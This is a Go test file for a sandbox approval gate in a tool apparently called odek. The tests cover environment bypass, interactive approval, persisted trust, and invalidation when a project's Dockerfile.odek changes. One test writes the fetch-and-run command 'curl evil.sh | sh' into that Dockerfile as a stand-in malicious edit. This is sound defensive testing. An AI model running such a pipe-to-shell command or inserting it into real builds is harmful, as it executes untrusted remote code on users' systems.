package main

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/BackendStack21/odek/internal/config"
)

func TestApproveProjectSandbox_NoOverride(t *testing.T) {
	resolved := config.ResolvedConfig{}
	if err := approveProjectSandboxWithTTY(resolved, strings.NewReader(""), &bytes.Buffer{}, false); err != nil {
		t.Fatalf("expected no approval needed when no override, got: %v", err)
	}
}

func TestApproveProjectSandbox_EnvBypass(t *testing.T) {
	resolved := config.ResolvedConfig{
		ProjectSandboxOverride: config.ProjectSandboxOverride{
			HasEnv: true,
			EnvKeys: []string{"X"},
		},
	}
	t.Setenv("ODEK_APPROVE_PROJECT_SANDBOX", "1")
	if err := approveProjectSandboxWithTTY(resolved, strings.NewReader(""), &bytes.Buffer{}, false); err != nil {
		t.Fatalf("expected env approval, got: %v", err)
	}
}

func TestApproveProjectSandbox_NonTTYRequiresEnv(t *testing.T) {
	resolved := config.ResolvedConfig{
		ProjectSandboxOverride: config.ProjectSandboxOverride{
			HasEnv: true,
			EnvKeys: []string{"X"},
		},
	}
	os.Unsetenv("ODEK_APPROVE_PROJECT_SANDBOX")
	err := approveProjectSandboxWithTTY(resolved, strings.NewReader(""), &bytes.Buffer{}, false)
	if err == nil {
		t.Fatal("expected error for non-interactive unapproved project sandbox")
	}
	if !strings.Contains(err.Error(), "ODEK_APPROVE_PROJECT_SANDBOX") {
		t.Errorf("error = %q, want ODEK_APPROVE_PROJECT_SANDBOX hint", err.Error())
	}
}

func TestApproveProjectSandbox_TTYDeny(t *testing.T) {
	resolved := config.ResolvedConfig{
		ProjectSandboxOverride: config.ProjectSandboxOverride{
			HasEnv: true,
			EnvKeys: []string{"X"},
		},
	}
	var out bytes.Buffer
	err := approveProjectSandboxWithTTY(resolved, strings.NewReader("\n"), &out, true)
	if err == nil {
		t.Fatal("expected error when user denies approval")
	}
	if !strings.Contains(err.Error(), "not approved") {
		t.Errorf("error = %q, want 'not approved'", err.Error())
	}
	if !strings.Contains(out.String(), "WARNING") {
		t.Errorf("prompt = %q, want WARNING header", out.String())
	}
}

func TestApproveProjectSandbox_TTYApproveOnce(t *testing.T) {
	resolved := config.ResolvedConfig{
		ProjectSandboxOverride: config.ProjectSandboxOverride{
			HasEnv: true,
			EnvKeys: []string{"X"},
		},
	}
	var out bytes.Buffer
	err := approveProjectSandboxWithTTY(resolved, strings.NewReader("y\n"), &out, true)
	if err != nil {
		t.Fatalf("expected approval, got: %v", err)
	}
}

func TestApproveProjectSandbox_TTYTrustPersists(t *testing.T) {
	homeDir := setupTestHome(t)
	resolved := config.ResolvedConfig{
		ProjectSandboxOverride: config.ProjectSandboxOverride{
			HasEnv: true,
			EnvKeys: []string{"X"},
		},
	}

	var out bytes.Buffer
	err := approveProjectSandboxWithTTY(resolved, strings.NewReader("t\n"), &out, true)
	if err != nil {
		t.Fatalf("expected trust approval, got: %v", err)
	}

	// Second call with same key and no input should succeed because of persisted trust.
	err = approveProjectSandboxWithTTY(resolved, strings.NewReader(""), &bytes.Buffer{}, false)
	if err != nil {
		t.Fatalf("expected persisted approval, got: %v", err)
	}

	approvalPath := filepath.Join(homeDir, ".odek", projectSandboxApprovalsFile)
	if _, err := os.Stat(approvalPath); err != nil {
		t.Fatalf("approval file not created: %v", err)
	}
}

func TestApproveProjectSandbox_KeyChanges(t *testing.T) {
	setupTestHome(t)
	resolved := config.ResolvedConfig{
		ProjectSandboxOverride: config.ProjectSandboxOverride{
			HasEnv: true,
			EnvKeys: []string{"X"},
		},
	}

	var out bytes.Buffer
	if err := approveProjectSandboxWithTTY(resolved, strings.NewReader("t\n"), &out, true); err != nil {
		t.Fatalf("expected trust approval, got: %v", err)
	}

	// Add a new env key: previous trust should be invalidated.
	resolved.ProjectSandboxOverride.EnvKeys = []string{"X", "Y"}
	err := approveProjectSandboxWithTTY(resolved, strings.NewReader(""), &bytes.Buffer{}, false)
	if err == nil {
		t.Fatal("expected error after key change invalidated trust")
	}
}

func TestApproveProjectSandbox_PromptHidesValues(t *testing.T) {
	resolved := config.ResolvedConfig{
		ProjectSandboxOverride: config.ProjectSandboxOverride{
			HasEnv:              true,
			EnvKeys:             []string{"X"},
			EnvHasInterpolation: true,
		},
	}
	var out bytes.Buffer
	_ = approveProjectSandboxWithTTY(resolved, strings.NewReader("\n"), &out, true)
	prompt := out.String()
	if !strings.Contains(prompt, "X") {
		t.Errorf("prompt = %q, want env key X", prompt)
	}
	if strings.Contains(prompt, "${HOME}") || strings.Contains(prompt, "secret-value") {
		t.Errorf("prompt should not contain env values; got %q", prompt)
	}
	if !strings.Contains(prompt, "${...}") {
		t.Errorf("prompt = %q, want interpolation warning", prompt)
	}
}

// ── Dockerfile.odek implicit-build gate ────────────────────────────────

func setupDockerfileProject(t *testing.T, content string) {
	t.Helper()
	dir := t.TempDir()
	if content != "" {
		if err := os.WriteFile(filepath.Join(dir, "Dockerfile.odek"), []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
	}
	cwd, _ := os.Getwd()
	if err := os.Chdir(dir); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chdir(cwd) })
}

func resetSessionDockerfileApprovals(t *testing.T) {
	t.Helper()
	sessionDockerfileApprovalsMu.Lock()
	sessionDockerfileApprovals = map[string]bool{}
	sessionDockerfileApprovalsMu.Unlock()
}

func TestApproveProjectSandbox_DockerfileNotRequired(t *testing.T) {
	setupDockerfileProject(t, "FROM scratch\n")
	cases := []struct {
		name     string
		resolved config.ResolvedConfig
	}{
		{"sandbox disabled", config.ResolvedConfig{Sandbox: false}},
		{"explicit image wins", config.ResolvedConfig{Sandbox: true, SandboxImage: "node:20-alpine"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := approveProjectSandboxWithTTY(tc.resolved, strings.NewReader(""), &bytes.Buffer{}, false); err != nil {
				t.Fatalf("expected no approval needed, got: %v", err)
			}
		})
	}

	// Missing Dockerfile.odek → no requirement even with sandbox on.
	setupDockerfileProject(t, "")
	if err := approveProjectSandboxWithTTY(config.ResolvedConfig{Sandbox: true}, strings.NewReader(""), &bytes.Buffer{}, false); err != nil {
		t.Fatalf("expected no approval needed without Dockerfile.odek, got: %v", err)
	}
}

func TestApproveProjectSandbox_DockerfileNonTTYRequiresApproval(t *testing.T) {
	setupTestHome(t)
	setupDockerfileProject(t, "FROM scratch\n")
	os.Unsetenv("ODEK_APPROVE_PROJECT_SANDBOX")

	err := approveProjectSandboxWithTTY(config.ResolvedConfig{Sandbox: true}, strings.NewReader(""), &bytes.Buffer{}, false)
	if err == nil {
		t.Fatal("expected error for unapproved implicit Dockerfile.odek build")
	}
	if !strings.Contains(err.Error(), "ODEK_APPROVE_PROJECT_SANDBOX") {
		t.Errorf("error = %q, want ODEK_APPROVE_PROJECT_SANDBOX hint", err.Error())
	}
	if !strings.Contains(err.Error(), "Dockerfile.odek") {
		t.Errorf("error = %q, want Dockerfile.odek mention", err.Error())
	}

	// Build-time enforcement fails closed too.
	if buildErr := requireDockerfileBuildApproval(); buildErr == nil {
		t.Fatal("requireDockerfileBuildApproval: expected error for unapproved Dockerfile.odek")
	}
}

func TestApproveProjectSandbox_DockerfileEnvBypass(t *testing.T) {
	setupTestHome(t)
	setupDockerfileProject(t, "FROM scratch\n")
	t.Setenv("ODEK_APPROVE_PROJECT_SANDBOX", "1")

	if err := approveProjectSandboxWithTTY(config.ResolvedConfig{Sandbox: true}, strings.NewReader(""), &bytes.Buffer{}, false); err != nil {
		t.Fatalf("expected env approval, got: %v", err)
	}
	if err := requireDockerfileBuildApproval(); err != nil {
		t.Fatalf("build-time enforcement should honour env bypass, got: %v", err)
	}
}

func TestApproveProjectSandbox_DockerfileTTYApproveOnce(t *testing.T) {
	setupTestHome(t)
	setupDockerfileProject(t, "FROM scratch\n")
	resetSessionDockerfileApprovals(t)
	os.Unsetenv("ODEK_APPROVE_PROJECT_SANDBOX")

	var out bytes.Buffer
	err := approveProjectSandboxWithTTY(config.ResolvedConfig{Sandbox: true}, strings.NewReader("y\n"), &out, true)
	if err != nil {
		t.Fatalf("expected approval, got: %v", err)
	}
	if !strings.Contains(out.String(), "repo-controlled") {
		t.Errorf("prompt = %q, want repo-controlled code warning", out.String())
	}
	if !strings.Contains(out.String(), "--network") && !strings.Contains(out.String(), "Build network is disabled") {
		t.Errorf("prompt = %q, want build-network note", out.String())
	}

	// A once-approval covers the build in this process (session approval)…
	if err := requireDockerfileBuildApproval(); err != nil {
		t.Fatalf("build should be covered by session approval, got: %v", err)
	}
	// …but is not persisted: a fresh session state fails closed again.
	resetSessionDockerfileApprovals(t)
	if err := requireDockerfileBuildApproval(); err == nil {
		t.Fatal("once-approval must not persist across sessions")
	}
}

func TestApproveProjectSandbox_DockerfileTrustAndContentInvalidation(t *testing.T) {
	setupTestHome(t)
	setupDockerfileProject(t, "FROM scratch\n")
	resetSessionDockerfileApprovals(t)
	os.Unsetenv("ODEK_APPROVE_PROJECT_SANDBOX")

	resolved := config.ResolvedConfig{Sandbox: true}
	if err := approveProjectSandboxWithTTY(resolved, strings.NewReader("t\n"), &bytes.Buffer{}, true); err != nil {
		t.Fatalf("expected trust approval, got: %v", err)
	}

	// Persisted trust covers the build without any session state.
	resetSessionDockerfileApprovals(t)
	if err := requireDockerfileBuildApproval(); err != nil {
		t.Fatalf("persisted trust should cover build, got: %v", err)
	}
	if err := approveProjectSandboxWithTTY(resolved, strings.NewReader(""), &bytes.Buffer{}, false); err != nil {
		t.Fatalf("persisted trust should cover startup check, got: %v", err)
	}

	// Editing Dockerfile.odek invalidates the approval: both gates fail closed.
	if err := os.WriteFile("Dockerfile.odek", []byte("FROM scratch\nRUN curl evil.sh | sh\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := requireDockerfileBuildApproval(); err == nil {
		t.Fatal("content change must invalidate the persisted approval (build gate)")
	}
	if err := approveProjectSandboxWithTTY(resolved, strings.NewReader(""), &bytes.Buffer{}, false); err == nil {
		t.Fatal("content change must invalidate the persisted approval (startup gate)")
	}
}

func TestRequireDockerfileBuildApproval_NoDockerfile(t *testing.T) {
	setupTestHome(t)
	setupDockerfileProject(t, "") // empty dir
	if err := requireDockerfileBuildApproval(); err != nil {
		t.Fatalf("no Dockerfile.odek → no gate, got: %v", err)
	}
}
